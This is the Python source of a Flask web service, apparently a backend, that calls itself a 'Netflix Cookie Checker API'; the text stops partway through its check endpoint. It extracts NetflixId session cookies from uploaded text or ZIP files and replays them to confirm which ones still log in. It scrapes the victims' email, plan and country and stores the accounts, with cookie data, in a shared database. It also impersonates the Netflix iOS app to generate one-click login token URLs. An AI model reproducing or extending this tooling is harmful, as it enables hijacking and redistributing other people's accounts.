from flask import Flask, request, jsonify, send_from_directory, make_response, stream_with_context, Response
from flask_cors import CORS, cross_origin
from functools import wraps
import os
import re
import json
import requests
import zipfile
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import logging
import tempfile
import shutil
import uuid
import hashlib
from datetime import datetime
from supabase import create_client, Client
from gotrue.errors import AuthApiError
from dotenv import load_dotenv
from deep_translator import GoogleTranslator
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_talisman import Talisman
import secrets
from marshmallow import Schema, fields, validate, ValidationError
from flask import Flask, session
from datetime import timedelta
from functools import wraps

load_dotenv()
urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)


limiter = Limiter(app=app, key_func=get_remote_address, default_limits=[])

app.config['SESSION_TYPE'] = 'filesystem'  
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'


# Production-ready Talisman
Talisman(app, 
    force_https=False,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# Fixed CORS - removed wildcard with credentials
ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:5000",
    "http://localhost:8080",
    "https://hakdowken.vercel.app",
    "https://nftoken.vonezis.me"
]

CORS(app, resources={
    r"/api/*": {
        "origins": ALLOWED_ORIGINS,
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
        "supports_credentials": True,
        "max_age": 86400
    }
})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Vercel temp directory
TEMP_DIR = "/tmp"

# Supabase configuration
SUPABASE_URL = os.environ.get('SUPABASE_URL', 'your-supabase-url')
SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', 'your-service-role-key')
SUPABASE_ANON_KEY = os.environ.get('SUPABASE_ANON_KEY', 'your-anon-key')
SUPER_ADMIN_EMAILS = os.environ.get('SUPER_ADMIN_EMAILS', '').split(',')
SUPER_ADMIN_IDS = os.environ.get('SUPER_ADMIN_IDS', '').split(',')

required_env = ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY']
missing = [var for var in required_env if not os.environ.get(var)]
if missing:
    logger.warning(f"Missing environment variables: {missing}")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)

translator = GoogleTranslator(source='auto', target='en')

# Validation Schema
class CookieCheckSchema(Schema):
    content = fields.String(required=True)
    mode = fields.String(validate=validate.OneOf(['check_only', 'generate_token']), 
                        missing='check_only')

def validate_input(data):
    schema = CookieCheckSchema()
    try:
        return schema.load(data), None
    except ValidationError as err:
        return None, err.messages

def translate_plan_name(plan_name):
    if not plan_name or plan_name == "Unknown":
        return "Unknown"
    
    decoded = decode_unicode(plan_name)
    cleaned = decoded.strip().lower()
    cleaned_no_spaces = cleaned.replace(' ', '').replace('-', '').replace('_', '')
    
    PLAN_TRANSLATIONS = {
        'พรีเมียม': 'Premium', 'สแตนดาร์ด': 'Standard', 'เบสิก': 'Basic', 'โมบาย': 'Mobile',
        'โฆษณา': 'Standard with Ads', 'premium': 'Premium', 'estándar': 'Standard',
        'básico': 'Basic', 'básica': 'Basic', 'móvil': 'Mobile', 'con anuncios': 'Standard with Ads',
        'padrão': 'Standard', 'com anúncios': 'Standard with Ads', 'prêmio': 'Premium',
        'essentiel': 'Basic', 'avec publicité': 'Standard with Ads', 'sans publicité': 'Standard',
        'basis': 'Basic', 'werbefrei': 'Standard', 'base': 'Basic', 'standaard': 'Standard',
        'プレミアム': 'Premium', 'スタンダード': 'Standard', 'ベーシック': 'Basic', '広告付き': 'Standard with Ads',
        '프리미엄': 'Premium', '스탠다드': 'Standard', '베이직': 'Basic', '광고 포함': 'Standard with Ads',
        '高级': 'Premium', '标准': 'Standard', '基础': 'Basic', '含广告': 'Standard with Ads', '无广告': 'Standard',
        'премиум': 'Premium', 'стандарт': 'Standard', 'базовый': 'Basic', 'с рекламой': 'Standard with Ads',
        'بريميوم': 'Premium', 'ستاندرد': 'Standard', 'أساسي': 'Basic', 'مع إعلانات': 'Standard with Ads',
        'temel': 'Basic', 'standart': 'Standard', 'reklamlı': 'Standard with Ads',
        'podstawowy': 'Basic', 'z reklamami': 'Standard with Ads',
        'standar': 'Standard', 'dasar': 'Basic', 'dengan iklan': 'Standard with Ads',
        'cao cấp': 'Premium', 'tiêu chuẩn': 'Standard', 'cơ bản': 'Basic', 'có quảng cáo': 'Standard with Ads',
    }
    
    if cleaned in PLAN_TRANSLATIONS:
        return PLAN_TRANSLATIONS[cleaned]
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['premium', 'uhd', 'ultra', '4k', 'hdr', 'พรีเมียม', '프리미엄', 'プレミアム', '高级', 'премиум', 'بريميوم', 'cao', 'prêmio']):
        return 'Premium'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['standard', 'standaard', 'estándar', 'padrão', 'スタンダード', '스탠다드', '标准', 'สแตนดาร์ด', 'standart', 'tiêu']):
        return 'Standard'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['basic', 'basis', 'básico', 'básica', 'ベーシック', '基础', 'เบสิก', 'essentiel', 'базовый', 'أساسي', 'temel', 'podstawowy', 'dasar', 'cơ', 'base']):
        return 'Basic'
    
    if any(keyword in cleaned or keyword in cleaned_no_spaces for keyword in 
           ['mobile', 'móvil', 'móvel', 'โมบาย']):
        return 'Mobile'
    
    if any(keyword in cleaned for keyword in 
           ['ads', 'ad', 'anuncios', 'anúncios', 'publicidad', 'werbung', 'reklam', 'iklan', 'quảng cáo', 'إعلانات', 'реклама', '広告']):
        return 'Standard with Ads'
    
    return decoded.title()

PLAN_TRANSLATIONS_FALLBACK = {
    'พรีเมียม': 'Premium', 'สแตนดาร์ด': 'Standard', 'เบสิก': 'Basic', 'โมบาย': 'Mobile', 'โฆษณา': 'Standard with Ads',
    'premium': 'Premium', 'estándar': 'Standard', 'padrão': 'Standard', 'básico': 'Basic', 'básica': 'Basic',
    'móvil': 'Mobile', 'móvel': 'Mobile', 'con anuncios': 'Standard with Ads', 'com anúncios': 'Standard with Ads',
    'essentiel': 'Basic', 'standard': 'Standard', 'basis': 'Basic', 'werbefrei': 'Standard',
    'プレミアム': 'Premium', 'スタンダード': 'Standard', 'ベーシック': 'Basic',
    '프리미엄': 'Premium', '스탠다드': 'Standard', '베이직': 'Basic',
    '高级': 'Premium', '标准': 'Standard', '基础': 'Basic', '含广告': 'Standard with Ads',
    'премиум': 'Premium', 'стандарт': 'Standard', 'базовый': 'Basic',
    'بريميوم': 'Premium', 'ستاندرد': 'Standard', 'أساسي': 'Basic',
    'temel': 'Basic', 'podstawowy': 'Basic', 'standar': 'Standard', 'dasar': 'Basic',
    'cao cấp': 'Premium', 'tiêu chuẩn': 'Standard', 'cơ bản': 'Basic',
}

def translate_plan_name_with_fallback(plan_name):
    if not plan_name or plan_name == "Unknown":
        return "Unknown"
    
    cleaned = plan_name.strip().lower()
    
    if cleaned in PLAN_TRANSLATIONS_FALLBACK:
        return PLAN_TRANSLATIONS_FALLBACK[cleaned]
    
    try:
        translated = translator.translate(plan_name)
        if translated:
            translated_clean = translated.strip().lower()
            
            if 'premium' in translated_clean or 'ultra' in translated_clean:
                return 'Premium'
            elif 'standard' in translated_clean:
                return 'Standard'
            elif 'basic' in translated_clean or 'essential' in translated_clean:
                return 'Basic'
            elif 'mobile' in translated_clean:
                return 'Mobile'
            elif 'ad' in translated_clean:
                return 'Standard with Ads'
            
            return translated.title()
    except Exception as e:
        logger.warning(f"Auto-translation failed, using original: {e}")
    
    return plan_name.title()

@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response

@app.route('/api/<path:path>', methods=['OPTIONS'])
def options_handler(path):
    return '', 204

def extract_netflix_id(content):
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId":
                        return cookie.get("value")
    except:
        pass
    
    netflix_id_match = re.search(r'(?<!\w)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    plain_match = re.search(r'NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    
    url = 'https://www.netflix.com/YourAccount'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        resp = session.get(url, headers=headers, timeout=30)
        txt = resp.text
        
        if '"mode":"login"' in txt.lower():
            return {'ok': False, 'err': 'Invalid cookie'}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Not logged in'}

        def find(pattern, flags=0):
            m = re.search(pattern, txt, flags)
            return m.group(1).strip() if m else "Unknown"

        # === PLAN DETECTION (keep existing) ===
        raw_plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'localizedPlanName[^}]+"value":"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"currentPlanName"\s*:\s*"([^"]+)"')
        if raw_plan == "Unknown":
            raw_plan = find(r'"plan"\s*:\s*"([^"]+)"')
        
        plan = translate_plan_name(raw_plan)

        # === IMPROVED COUNTRY DETECTION ===
        
        # 1. Where account was created (original)
        signup_country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
        
        # 2. Current country based on IP/location (BEST - if available)
        current_country = find(r'"currentCountry"\s*:\s*"([^"]+)"')
        
        # 3. Country from membership details
        membership_country = find(r'"country"\s*:\s*"([^"]+)"')
        
        # 4. From locale settings
        locale = find(r'"locale"\s*:\s*"([^"]+)"')
        locale_country = locale.split('_')[0].upper() if locale and '_' in locale else None
        if not locale_country and locale and len(locale) == 2:
            locale_country = locale.upper()
        
        # 5. From currency (backup)
        currency = find(r'"currency"\s*:\s*"([^"]+)"')
        currency_map = {
            'PHP': 'PH', 'USD': 'US', 'EUR': 'EU', 'GBP': 'GB', 'JPY': 'JP',
            'KRW': 'KR', 'THB': 'TH', 'IDR': 'ID', 'MYR': 'MY', 'SGD': 'SG',
            'AUD': 'AU', 'CAD': 'CA', 'MXN': 'MX', 'BRL': 'BR', 'ARS': 'AR',
            'CLP': 'CL', 'COP': 'CO', 'PEN': 'PE', 'CHF': 'CH', 'SEK': 'SE',
            'NOK': 'NO', 'DKK': 'DK', 'PLN': 'PL', 'CZK': 'CZ', 'HUF': 'HU',
            'RON': 'RO', 'BGN': 'BG', 'HRK': 'HR', 'TRY': 'TR', 'ILS': 'IL',
            'AED': 'AE', 'SAR': 'SA', 'ZAR': 'ZA', 'INR': 'IN', 'PKR': 'PK',
            'BDT': 'BD', 'LKR': 'LK', 'NPR': 'NP', 'MMK': 'MM', 'VND': 'VN',
            'TWD': 'TW', 'HKD': 'HK', 'CNY': 'CN', 'RUB': 'RU', 'UAH': 'UA',
            'KZT': 'KZ', 'EGP': 'EG', 'NGN': 'NG', 'KES': 'KE', 'GHS': 'GH'
        }
        currency_country = currency_map.get(currency, None)
        
        # 6. Detect from page language/content (fallback)
        detected_country = None
        txt_lower = txt.lower()
        
        # Check for specific language indicators
        if '"es-ES"' in txt or 'es_ES' in txt or 'España' in txt:
            detected_country = 'ES'
        elif '"es-' in txt or 'espanol' in txt_lower or 'español' in txt_lower:
            detected_country = 'MX'  # Generic Spanish/LATAM
        elif '"pt-BR"' in txt or 'pt_BR' in txt or 'Brasil' in txt:
            detected_country = 'BR'
        elif '"pt-' in txt or 'portugues' in txt_lower:
            detected_country = 'PT'
        elif '"fr-FR"' in txt or 'fr_FR' in txt:
            detected_country = 'FR'
        elif '"fr-' in txt or 'francais' in txt_lower:
            detected_country = 'CA'  # or FR
        elif '"de-DE"' in txt or 'de_DE' in txt:
            detected_country = 'DE'
        elif '"de-' in txt or 'deutsch' in txt_lower:
            detected_country = 'AT'  # or DE/CH
        elif '"it-IT"' in txt or 'it_IT' in txt:
            detected_country = 'IT'
        elif '"ja-JP"' in txt or 'ja_JP' in txt or '日本' in txt:
            detected_country = 'JP'
        elif '"ko-KR"' in txt or 'ko_KR' in txt or '한국' in txt:
            detected_country = 'KR'
        elif '"th-TH"' in txt or 'th_TH' in txt or 'ไทย' in txt:
            detected_country = 'TH'
        elif '"ph-PH"' in txt or 'ph_PH' in txt or 'Pilipinas' in txt:
            detected_country = 'PH'
        elif '"id-ID"' in txt or 'id_ID' in txt or 'Indonesia' in txt:
            detected_country = 'ID'
        elif '"vi-VN"' in txt or 'vi_VN' in txt or 'Việt Nam' in txt:
            detected_country = 'VN'
        elif '"ms-MY"' in txt or 'ms_MY' in txt or 'Malaysia' in txt:
            detected_country = 'MY'
        elif '"zh-TW"' in txt or 'zh_TW' in txt or '台灣' in txt:
            detected_country = 'TW'
        elif '"zh-HK"' in txt or 'zh_HK' in txt or '香港' in txt:
            detected_country = 'HK'
        elif '"zh-CN"' in txt or 'zh_CN' in txt or '中国' in txt:
            detected_country = 'CN'
        elif '"tr-TR"' in txt or 'tr_TR' in txt or 'Türkiye' in txt:
            detected_country = 'TR'
        elif '"ar-' in txt or 'العربية' in txt:
            detected_country = 'SA'  # Generic Arabic
        elif '"pl-PL"' in txt or 'pl_PL' in txt:
            detected_country = 'PL'
        elif '"nl-NL"' in txt or 'nl_NL' in txt:
            detected_country = 'NL'
        elif '"sv-SE"' in txt or 'sv_SE' in txt:
            detected_country = 'SE'
        elif '"en-GB"' in txt or 'en_GB' in txt:
            detected_country = 'GB'
        elif '"en-US"' in txt or 'en_US' in txt:
            detected_country = 'US'
        elif '"en-' in txt:
            detected_country = 'US'  # Default English
        
        # Priority: current_country > detected from content > membership > signup > locale > currency
        country = (
            current_country if current_country != "Unknown" else
            detected_country if detected_country else
            membership_country if membership_country != "Unknown" else
            signup_country if signup_country != "Unknown" else
            locale_country if locale_country else
            currency_country if currency_country else
            "Unknown"
        )

        email = find(r'"emailAddress"\s*:\s*"([^"]+)"')
        if email != "Unknown":
            email = urllib.parse.unquote(email)

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_valid = bool(status_match)
        is_premium = is_valid and status_match.group(1) == 'CURRENT_MEMBER'
        
        # Determine subscription type from plan
        subscription_type = "Standard"
        plan_lower = plan.lower()

        if "premium" in plan_lower:
            subscription_type = "Premium"
        elif "standard" in plan_lower:
            subscription_type = "Standard"
        elif "basic" in plan_lower:
            subscription_type = "Basic"
        elif "mobile" in plan_lower:
            subscription_type = "Mobile"
        
        # Additional detection from page content if plan is Unknown
        if plan == "Unknown" and is_premium:
            if any(indicator in txt_lower for indicator in ['"isuhdavailable":true', '"uhd":true', '"hdr":true', '"4k":true']):
                plan = "Premium (UHD)"
                subscription_type = "Premium"
            elif '"maxstreams":4' in txt_lower:
                plan = "Premium (4 screens)"
                subscription_type = "Premium"
            elif '"maxstreams":2' in txt_lower:
                plan = "Standard (2 screens)"
                subscription_type = "Standard"

        return {
            'ok': is_valid,
            'premium': is_premium,
            'email': email,
            'country': country,           # Best detected current country
            'signup_country': signup_country if signup_country != "Unknown" else country,  # Where account was created
            'plan': plan,
            'subscription_type': subscription_type,
            'detection_method': (
                'current_ip' if current_country != "Unknown" else
                'content_language' if detected_country else
                'membership' if membership_country != "Unknown" else
                'signup' if signup_country != "Unknown" else
                'locale' if locale_country else
                'currency' if currency_country else
                'unknown'
            )
        }
        
    except Exception as e:
        logger.error(f"Error checking cookie: {str(e)}")
        return {'ok': False, 'err': str(e)}

def decode_unicode(text):
    if not text or not isinstance(text, str):
        return text
    try:
        return text.encode('utf-8').decode('unicode-escape')
    except:
        return text

def generate_token(netflix_id):
    url = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
    
    params = {
        'appVersion': "15.48.1",
        'config': '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
        'device_type': "NFAPPL-02-",
        'esn': "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'idiom': "phone",
        'iosVersion': "15.8.5",
        'isTablet': "false",
        'languages': "en-US",
        'locale': "en-US",
        'maxDeviceWidth': "375",
        'model': "saget",
        'modelType': "IPHONE8-1",
        'odpAware': "true",
        'path': '["account","token","default"]',
        'pathFormat': "graph",
        'pixelDensity': "2.0",
        'progressive': "false",
        'responseFormat': "json"
    }

    headers = {
        'User-Agent': "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        'x-netflix.request.attempt': "1",
        'x-netflix.request.client.user.guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.context.profile-guid': "A4CS633D7VCBPE2GPK2HL4EKOE",
        'x-netflix.request.routing': '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        'x-netflix.context.app-version': "15.48.1",
        'x-netflix.argo.translated': "true",
        'x-netflix.context.form-factor': "phone",
        'x-netflix.context.sdk-version': "2012.4",
        'x-netflix.client.appversion': "15.48.1",
        'x-netflix.context.max-device-width': "375",
        'x-netflix.context.ab-tests': "",
        'x-netflix.tracing.cl.useractionid': "4DC655F2-9C3C-4343-8229-CA1B003C3053",
        'x-netflix.client.type': "argo",
        'x-netflix.client.ftl.esn': "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        'x-netflix.context.locales': "en-US",
        'x-netflix.context.top-level-uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.client.iosversion': "15.8.5",
        'accept-language': "en-US;q=1",
        'x-netflix.argo.abtests': "",
        'x-netflix.context.os-version': "15.8.5",
        'x-netflix.request.client.context': '{"appState":"foreground"}',
        'x-netflix.context.ui-flavor': "argo",
        'x-netflix.argo.nfnsm': "9",
        'x-netflix.context.pixel-density': "2.0",
        'x-netflix.request.toplevel.uuid': "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
        'x-netflix.request.client.timezoneid': "Asia/Dhaka",
        'Cookie': f"NetflixId={netflix_id}"
    }

    try:
        response = requests.get(url, params=params, headers=headers, timeout=30, verify=False)
        data = response.json()
        
        if "value" in data and data["value"] and "account" in data["value"]:
            token_data = data["value"]["account"]["token"]["default"]
            token = token_data["token"]
            expires = token_data["expires"]
            
            if len(str(expires)) == 13:
                expires //= 1000
            
            login_urls = {
                "phone": f"https://netflix.com/unsupported?nftoken={token}",
                "tv": f"https://netflix.com/tv8?nftoken={token}",
                "pc": f"https://netflix.com/browse?nftoken={token}"
            }
            
            return {
                "status": "Success",
                "token": token,
                "expires": expires,
                "login_urls": login_urls
            }
        return {"status": "Failure", "error": "No token"}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

def extract_zip_and_get_files(zip_path, extract_dir):
    txt_files = []
    try:
        # Use /tmp for Vercel compatibility
        extract_dir = os.path.join(TEMP_DIR, os.path.basename(extract_dir))
        os.makedirs(extract_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.lower().endswith('.txt'):
                    txt_files.append(os.path.join(root, file))
        return txt_files
    except Exception as e:
        logger.error(f"Error extracting ZIP: {e}")
        return []

def get_user_from_token(auth_header):
    if not auth_header or not auth_header.startswith('Bearer '):
        return None
    
    token = auth_header.split(' ')[1]
    try:
        user = supabase.auth.get_user(token)
        return user.user if user else None
    except:
        return None

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'status': 'error', 'message': 'Authentication required'}), 401
        
        token = auth_header.split(' ')[1]
        try:
            # Try to get user - this validates the token
            user = supabase.auth.get_user(token)
            
            # CRITICAL: Check if token needs refresh
            session = supabase.auth.get_session()
            if session and session.expires_at:
                import time
                if session.expires_at < time.time() + 300:  # Expires in 5 min
                    # Refresh the token
                    new_session = supabase.auth.refresh_session()
                    if new_session:
                        # Return new token in response header
                        g.new_token = new_session.access_token
            
            return f(user.user, *args, **kwargs)
            
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return jsonify({'status': 'error', 'message': 'Invalid or expired token'}), 401
    
    return decorated_function

def check_premium_status(user_id):
    try:
        cache_key = f"premium:{user_id}"
        
        result = supabase.table('user_profiles')\
            .select('is_premium')\
            .eq('id', user_id)\
            .single()\
            .execute()
        
        is_premium = result.data.get('is_premium', False) if result.data else False
        
        # Cache the result
        return is_premium
        
    except Exception as e:
        logger.error(f"Error checking premium status: {e}")
        return False  # Fail-safe: assume not premium on error

def store_netflix_account(email, netflix_id, subscription_type, country, plan, 
                         cookie_content, user_id, signup_country=None, 
                         detection_method=None, is_exclusive=False, 
                         reserved_for_admin=False):
    """Store account with exclusive access flags"""
    try:
        adding_user_is_admin = is_super_admin(user_id)
        
        account_data = {
            'email': email,
            'netflix_id': netflix_id,
            'subscription_type': subscription_type,
            'country': country,
            'signup_country': signup_country or country,
            'plan': plan,
            'is_premium': True,
            'cookie_data': cookie_content[:500] if cookie_content else None,
            'added_by': str(user_id),
            'last_checked': datetime.utcnow().isoformat(),
            'is_active': True,
            'detection_method': detection_method,
            'exclusive_access': is_exclusive if adding_user_is_admin else False,
            'reserved_for_super_admin': reserved_for_admin if adding_user_is_admin else False
        }
        
        # Check if account exists using the global client
        existing = supabase.table('netflix_accounts').select('id').eq('email', email).execute()
        
        if existing.data:
            account_id = existing.data[0]['id']
            result = supabase.table('netflix_accounts').update(account_data).eq('id', account_id).execute()
            logger.info(f"Updated existing account: {email}")
        else:
            result = supabase.table('netflix_accounts').insert(account_data).execute()
            logger.info(f"Inserted new account: {email}")
            
        # Verify the result
        if result.data:
            logger.info(f"Store account SUCCESS: {email}, exclusive={account_data['exclusive_access']}")
            return True, result.data[0] if result.data else None
        else:
            logger.error(f"Store account returned no data for: {email}")
            return False, None
            
    except Exception as e:
        logger.error(f"Error storing account: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return False, None
        

def log_token_generation(account_id, user_id, ip_address, token=None):
    try:
        headers = {
            'apikey': SUPABASE_SERVICE_KEY,
            'Authorization': f'Bearer {SUPABASE_SERVICE_KEY}',
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
        }
        
        log_data = {
            'account_id': str(account_id),
            'generated_by': str(user_id),
            'ip_address': str(ip_address) if ip_address else None
        }
        
        if token:
            log_data['token_hash'] = hashlib.sha256(token.encode()).hexdigest()[:32]
            log_data['token'] = token[:100]
        
        url = f"{SUPABASE_URL}/rest/v1/token_logs"
        resp = requests.post(url, headers=headers, json=log_data)
        
        if resp.status_code == 201:
            logger.info(f"Token log SUCCESS")
            return True
        else:
            logger.error(f"Token log FAILED: {resp.status_code} - {resp.text}")
            return False
        
    except Exception as e:
        logger.error(f"Token log FAILED: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return False

@app.route('/')
def serve_index():
    return jsonify({
        "status": "ok",
        "message": "Netflix Cookie Checker API is running",
        "endpoints": {
            "test": "/api/test",
            "signup": "/api/auth/signup",
            "login": "/api/auth/login",
            "check": "/api/check",
            "accounts": "/api/accounts"
        }
    })

@app.route('/api/auth/signup', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def signup():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_up({
            "email": email,
            "password": password
        })
        
        return jsonify({
            'status': 'success',
            'message': 'User created successfully',
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': str(e)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/test', methods=['GET', 'OPTIONS'])
def test():
    return jsonify({"status": "ok", "message": "API is working!"})

@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
def login():
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'status': 'error', 'message': 'Email and password required'})
        
        auth_response = supabase.auth.sign_in_with_password({
            "email": email,
            "password": password
        })
        
        profile = supabase.table('user_profiles').select('*').eq('id', auth_response.user.id).single().execute()
        
        # Check if this user should be super admin based on env vars
        is_admin = (email in SUPER_ADMIN_EMAILS or 
                   str(auth_response.user.id) in SUPER_ADMIN_IDS or
                   profile.data.get('is_super_admin', False))
        
        # Update profile if env var match but DB flag not set
        if is_admin and not profile.data.get('is_super_admin', False):
            supabase.table('user_profiles').update({
                'is_super_admin': True,
                'role': 'super_admin'
            }).eq('id', auth_response.user.id).execute()
        
        return jsonify({
            'status': 'success',
            'session': {
                'access_token': auth_response.session.access_token,
                'refresh_token': auth_response.session.refresh_token,
                'expires_at': auth_response.session.expires_at
            },
            'user': {
                'id': auth_response.user.id,
                'email': auth_response.user.email,
                'is_premium': profile.data.get('is_premium', False),
                'is_super_admin': is_admin,
                'role': 'super_admin' if is_admin else profile.data.get('role', 'user')
            }
        })
    except AuthApiError as e:
        return jsonify({'status': 'error', 'message': 'Invalid credentials'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/logout', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def logout(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        supabase.auth.sign_out()
        return jsonify({'status': 'success', 'message': 'Logged out successfully'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/auth/me', methods=['GET', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def get_current_user(user):
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Max-Age', '86400')
        return response, 204
        
    try:
        profile = supabase.table('user_profiles').select('*').eq('id', user.id).single().execute()
        return jsonify({
            'status': 'success',
            'user': {
                'id': user.id,
                'email': user.email,
                'is_premium': profile.data.get('is_premium', False) if profile.data else False
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/check', methods=['POST', 'OPTIONS'])
@cross_origin(supports_credentials=True)
@require_auth
def check_cookie(user):
    if request.method == 'OPTIONS':
        return '', 204
    
    data, errors = validate_input(request.get_json())
    if errors:
        return jsonify({'status': 'error', 'message': 'Invalid input', 'errors': errors}), 400
        
    try:
        content = data.get('content', '')
        mode = data.get('mode', 'check_only')
        
        if not content:
            return jsonify({'status': 'error', 'message': 'No content provided'})
        
        netflix_id = extract_netflix_id(content)
        if not netflix_id:
            return jsonify({'status': 'error', 'message': 'No NetflixId found'})
        
        account_info = check_netflix_cookie({"NetflixId": netflix_id})
        
        if not account_info["ok"]:
            return jsonify({
                "status": "error",
                "message": account_info.get('err', 'Invalid account')
            })
        
